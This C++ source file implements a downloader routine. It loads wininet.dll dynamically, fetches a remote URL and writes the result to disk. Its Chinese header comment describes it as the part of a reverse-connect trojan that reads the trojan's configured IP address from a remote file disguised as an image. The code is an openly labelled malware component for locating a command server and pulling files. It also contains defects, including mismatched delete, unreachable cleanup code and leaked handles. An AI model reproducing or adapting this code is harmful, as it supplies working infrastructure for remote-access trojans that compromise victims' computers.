//读指定URL的内容，最多999个字节。反弹木马URL配置IP信息时用到，比如读取
//http://www.xxx.com/ip.jpg

//#include "windows.h"
#include "stdlib.h"
//#include "stdio.h"

#define HTTP_QUERY_CONTENT_LENGTH 5
#define INTERNET_SERVICE_HTTP 3
#define INTERNET_INVALID_PORT_NUMBER 0
#define INTERNET_FLAG_NO_CACHE_WRITE    0x04000000
#define INTERNET_FLAG_DONT_CACHE        INTERNET_FLAG_NO_CACHE_WRITE

//InternetReadFile(hFileUrl, data,sizeof(data), &dwFlags);
//dwFlags获得每次读取的数据长度,如果不等于0,就循环调用InternetReadFile 

BOOL HttpGetFile(char url_main[],char url_last[],char savepath[MAX_PATH])
{
	HMODULE hDll;
	LPVOID hSession,hConnect,hHttpFile; 

	hDll = LoadLibrary("wininet.dll");

	if(hDll)
	{
		
		typedef LPVOID         (WINAPI *pInternetOpen )(LPCTSTR ,DWORD ,LPCTSTR ,LPCTSTR ,DWORD );
		typedef BOOL    (WINAPI *pInternetCloseHandle )( LPVOID );
		typedef BOOL       (WINAPI *pInternetReadFile )(LPVOID ,LPVOID ,DWORD ,LPDWORD) ;
		typedef BOOL           (WINAPI *pHttpQueryInfo)(LPVOID,DWORD,LPVOID,LPDWORD,LPDWORD);
		typedef LPVOID       (WINAPI *pHttpOpenRequest)(LPVOID,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,LPCTSTR,DWORD,DWORD);	
		typedef BOOL         (WINAPI *pHttpSendRequest)(LPVOID,LPCTSTR,DWORD,LPVOID,DWORD);	
		typedef LPVOID       (WINAPI *pInternetConnect)(LPVOID,LPCTSTR,char,LPCTSTR,LPCTSTR,DWORD,DWORD,DWORD);
		
		pInternetOpen         InternetOpen = ( pInternetOpen ) GetProcAddress( hDll, "InternetOpenA" );
		pInternetCloseHandle  InternetCloseHandle = (pInternetCloseHandle) GetProcAddress (hDll,"InternetCloseHandle");
		pInternetReadFile     InternetReadFile = (pInternetReadFile) GetProcAddress(hDll,"InternetReadFile");	
		pInternetConnect      InternetConnect = (pInternetConnect) GetProcAddress(hDll,"InternetConnectA");
		pHttpQueryInfo        HttpQueryInfo = (pHttpQueryInfo) GetProcAddress(hDll,"HttpQueryInfoA");
		pHttpOpenRequest      HttpOpenRequest = (pHttpOpenRequest) GetProcAddress(hDll,"HttpOpenRequestA");
		pHttpSendRequest      HttpSendRequest = (pHttpSendRequest) GetProcAddress(hDll,"HttpSendRequestA");
		
		hSession = InternetOpen("lyyer",0, NULL, NULL, 0); //LPCSTR lpszAgent 得到实例

		if (hSession != NULL)
		{
			hConnect = InternetConnect(hSession,
				url_main, //char url_main[];
				0,
				"",
				"",
				INTERNET_SERVICE_HTTP,
				0,
				0);
			
			if (hConnect!=NULL)
			{
				hHttpFile = HttpOpenRequest(hConnect,
					"GET",
					url_last, //char url_
					"HTTP/1.0",
					NULL,
					0,
					INTERNET_FLAG_DONT_CACHE, 
					0) ;
				
				// Send the request.
				BOOL bSendRequest = HttpSendRequest(hHttpFile, NULL, 0, 0, 0);
				
				if (bSendRequest)
				{
					// Get the length of the file.            
					char bufQuery[32] ;
					DWORD dwLengthBufQuery = sizeof(bufQuery);
					BOOL bQuery = HttpQueryInfo(hHttpFile,
						HTTP_QUERY_CONTENT_LENGTH, 
						bufQuery, 
						&dwLengthBufQuery,
						0) ;
					
					// Convert length from ASCII string to a DWORD.
					DWORD dwFileSize = (DWORD)atol(bufQuery) ;
					
					// Allocate a buffer for the file.   

					char *buffer = new char[1024+1];
					memset(buffer,0,1025);
					DWORD dwBytesRead=0;
                    BOOL  bRead= false;
					DWORD write_size = 0;

					HANDLE hFile = CreateFile(savepath,
						GENERIC_WRITE,
						FILE_SHARE_READ|FILE_SHARE_WRITE,
						NULL,
						OPEN_ALWAYS,
						FILE_ATTRIBUTE_NORMAL,
						NULL);

					// Read the file into the buffer.    //多线程写文件

					//


					if (hFile)
					{	
						do 
						{
							bRead = InternetReadFile(hHttpFile,
								buffer,
								1024+1, 
								&dwBytesRead);
							WriteFile(hFile,buffer,dwBytesRead,&write_size,NULL);
							Sleep(1); //5
						} while(dwBytesRead);
					}
					else
					{
						return false;
						OutputDebugString("打开文件出错");
					}
					delete buffer;

					CloseHandle(hFile);
					return true;
					
				}
				
				
			}
			
			// Close all of the Internet handles.
			InternetCloseHandle(hHttpFile); 
			InternetCloseHandle(hConnect) ;
			InternetCloseHandle(hSession) ;
			
		}

		return false;
		FreeLibrary(hDll);
		
  }
  else
  {
	  OutputDebugString("LoadLibrary wininet error");
	  return false;
  }
}